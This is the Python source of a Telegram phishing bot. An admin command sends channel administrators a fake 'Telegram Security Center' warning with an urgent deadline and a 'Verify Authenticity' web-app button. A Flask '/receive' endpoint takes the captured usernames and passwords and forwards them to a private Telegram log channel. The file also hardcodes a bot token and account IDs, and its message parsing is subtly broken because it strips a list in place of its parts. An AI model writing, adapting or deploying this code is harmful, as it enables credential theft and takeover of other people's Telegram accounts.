import os, threading, datetime
from flask import Flask, request, jsonify
from flask_cors import CORS
from telebot import TeleBot, types

TOKEN = "8729895497:AAEqEZ3HA56FmQjm_kI5VmKxQn1a4HJBSuE"
ADMIN_ID = 8699819680
LOG_CHANNEL = -1003817774248
TMA_URL = "https://pawsofjoy.github.io/tma-research/" 

bot = TeleBot(TOKEN)
app = Flask(__name__)
CORS(app)

@app.route('/receive', methods=['POST'])
def receive_data():
    data = request.json
    if data:
        user = data.get('user', 'unknown')
        pwd = data.get('password', 'none')
        msg = f"📥 <b>NEW LOG RECEIVED:</b>\n\n👤 <b>Admin:</b> {user}\n🔑 <b>Password:</b> <code>{pwd}</code>"
        bot.send_message(LOG_CHANNEL, msg, parse_mode="HTML")
        return jsonify({"status": "sent"}), 200
    return jsonify({"status": "error"}), 400

@app.route('/')
def home(): return "Bot is Alive", 200

@bot.message_handler(commands=['trigger'])
def handle_trigger(message):
    if message.from_user.id == ADMIN_ID:
        try:
            # Cleans up any accidental line breaks or extra spaces
            clean_text = message.text.replace('/trigger', '').replace('\n', ' ').strip()
            
            # Splitting by @
            parts = clean_text.split('@')
            
            if len(parts) == 3:
                target_id = parts.strip()
                channel_name = parts.strip()
                admin_name = parts.strip()
                
                deadline = (datetime.datetime.now() + datetime.timedelta(hours=24)).strftime("%B %d, %H:%M UTC")
                
                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("Verify Authenticity", web_app=types.WebAppInfo(url=TMA_URL)))
                
                bait = (
                    f"<b>🛡 Telegram Security Center</b>\n\n"
                    f"Dear <b>{admin_name}</b>,\n\n"
                    f"Our automated security systems have detected unusual activity and an unauthorized login attempt associated with your administrative account for: <b>{channel_name}</b>.\n\n"
                    f"To maintain ownership privileges and prevent restriction, you are required to synchronize your 2FA credentials via the <b>Admin Portal</b> before <b>{deadline}</b>.\n\n"
                    f"<i>Note: Failure to verify may lead to a temporary suspension of administrative access.</i>"
                )
                
                bot.send_message(target_id, bait, parse_mode="HTML", reply_markup=markup)
                bot.send_message(ADMIN_ID, f"✅ Alert sent to {admin_name} for {channel_name}")
            else:
                bot.send_message(ADMIN_ID, "❌ Format error. Use:\n<code>/trigger ID @ Channel @ Name</code>", parse_mode="HTML")
        except Exception as e:
            bot.send_message(ADMIN_ID, f"❌ Error: {str(e)}")

if __name__ == "__main__":
    threading.Thread(target=lambda: bot.infinity_polling(), daemon=True).start()
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
